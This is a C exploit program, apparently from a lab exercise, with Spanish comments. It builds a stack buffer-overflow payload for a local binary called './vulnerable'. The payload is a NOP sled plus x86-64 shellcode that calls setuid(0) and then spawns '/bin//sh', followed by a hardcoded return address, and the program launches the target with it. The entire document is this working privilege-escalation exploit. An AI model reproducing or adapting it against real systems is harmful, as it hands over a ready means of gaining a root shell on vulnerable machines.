#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>

int main() {
     char shellcode[] = "\x48\x31\xc0\xb0\x69\x48\x31\xff\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";
    
    // Convertir dirección de retorno de string a valor numérico
    unsigned long ret_addr = strtoul("0x00007fffffffec50", NULL, 16);

    char payload[80];
    char *args[] = { "./vulnerable", payload, NULL };
    char *env[] = { NULL };

    // Llenar el payload con NOPs
    memset(payload, '\x90', 80);

    // Copiar el shellcode después de 10 bytes de NOPs
    memcpy(payload + 10, shellcode, strlen(shellcode));

    // Sobrescribir la dirección de retorno (little-endian)
    // memcpy(payload + 72, "\xb8\xe1\xff\xff\x7f\x00\x00\x00", 8);
    memcpy(payload + 72, &ret_addr, sizeof(ret_addr));
    // Ejecutar el programa vulnerable con nuestro payload
    execve(args[0], args, env);

    return 1;
}